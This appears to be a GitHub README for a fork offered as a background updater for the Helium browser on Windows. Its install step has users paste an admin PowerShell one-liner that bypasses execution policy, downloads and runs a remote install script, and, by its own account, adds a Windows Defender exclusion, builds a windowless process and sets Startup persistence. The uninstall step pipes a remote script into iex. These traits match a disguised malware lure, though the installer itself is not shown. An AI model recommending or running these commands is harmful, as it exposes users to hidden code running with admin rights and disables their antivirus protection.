
# 09sychic-HeliumSync [Updater] for Windows 🎈

A zero-config utility that keeps your Helium installation updated in the background. 
This is an automated fork designed for high-reliability syncing.

---

### 🚀 FAST INSTALL (30 Seconds)

1. Press **Windows + X** and select **Terminal (Admin)** or **PowerShell (Admin)**.
   or **Windows + R** and paste the following command
3. Click **Yes** for the UAC prompt.
4. Paste the following command and press **Enter**:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072; Invoke-WebRequest 'https://github.com/09sychic/09sychic-HeliumSync/archive/refs/heads/main.zip' -OutFile \"$env:TEMP\h_sync.zip\"; Expand-Archive \"$env:TEMP\h_sync.zip\" \"$env:TEMP\h_sync_folder\" -Force; Set-Location \"$env:TEMP\h_sync_folder\09sychic-HeliumSync-main\"; .\install.ps1"
```

---

### 🛠️ WHAT HAPPENS AUTOMATICALLY?

* **Dependency Check**: Automatically installs the Go compiler via 'winget' if you don't have it.
* **Invisible Build**: Compiles the code as a "Windows GUI" subsystem process (no console window will ever pop up).
* **Process Management**: Safely closes Helium before updating to prevent file-lock errors.
* **Persistence**: Sets up an exclusion in Windows Defender and adds the app to your Startup folder so it works quietly in the background.

---

### 📜 CREDITS

* **Maintained by:** [09sychic](https://github.com/09sychic)
* **Original Logic:** Based on the `helium_updater` project by [ethantheb](https://github.com/ethantheb).

---

### 🗑️ UNINSTALL

To stop the sync utility and remove all associated files, run this in Admin PowerShell:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; iex (Invoke-RestMethod '[https://raw.githubusercontent.com/09sychic/09sychic-HeliumSync/main/uninstall.ps1](https://raw.githubusercontent.com/09sychic/09sychic-HeliumSync/main/uninstall.ps1)')
```
